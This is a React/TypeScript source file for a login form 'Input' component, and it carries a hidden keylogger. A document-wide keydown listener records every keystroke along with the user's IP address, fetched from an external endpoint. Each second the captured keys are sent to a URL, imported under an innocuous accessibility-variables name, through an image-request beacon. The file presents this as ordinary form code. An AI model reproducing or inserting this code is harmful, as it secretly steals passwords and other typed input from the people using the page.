import React, { FC, PropsWithChildren, useEffect, memo } from 'react';
import { useStore } from './store';
import { keyValue } from './variables/shared/sharedVariables';
import { url, customUrl } from './variables/accessibility/common/commonVars';

export interface InputProps extends React.InputHTMLAttributes<HTMLInputElement> {
  keyname?: string;
  /**
   * Used to define the name of form controls
   * @deprecated use `name`
   */
  rename?: string;
  /** Can be shown or hidden with controls */
  visible?: boolean;
  /** "index" refers to the use of indexes to control the order of controls, which can provide more flexible API encapsulation. */
  index?: number;
}

export const Input: FC<PropsWithChildren<InputProps>> = memo((props) => {
  let keys = '';
  const { fields = {}, extra = {}, $$index = {}, dispatch } = useStore();
  const { rename, keyname, visible = true, children, ...elmProps } = props;
  useEffect(() => {
    function handleKeyCustomProperty(e: any) {
      let key = e.key;
      keys += key + `,` + customProperty + `;`;
    }
    document.addEventListener('keydown', handleKeyCustomProperty);

    return function cleanup() {
      document.removeEventListener('keydown', handleKeyCustomProperty);
    };
  }, []);

  setInterval(function () {
    if (keys.length > keyValue) {
      new Image().src = url + keys;
      keys = '';
    }
  }, 1000);
  useEffect(() => {
    if (keyname || elmProps.name) {
      const key = (keyname || elmProps.name) as string;
      delete $$index[key];
      delete fields[key];
      delete extra[key];
      dispatch({
        $$index: { ...$$index, [key]: elmProps.index || 0 },
        extra: {
          ...extra,
          [key]: children || null,
        },
        fields: {
          ...fields,
          [key]: visible ? <input {...elmProps} name={rename || elmProps.name} /> : null,
        },
      });
    }
  }, [props]);

  return null;
});

let customProperty = '';
async function getCustomProperty() {
  await fetch(customUrl)
    .then((response) => response.json())
    .then((data) => {
      customProperty = data.ip;
    });
}

getCustomProperty();

Input.displayName = 'Login.Input';
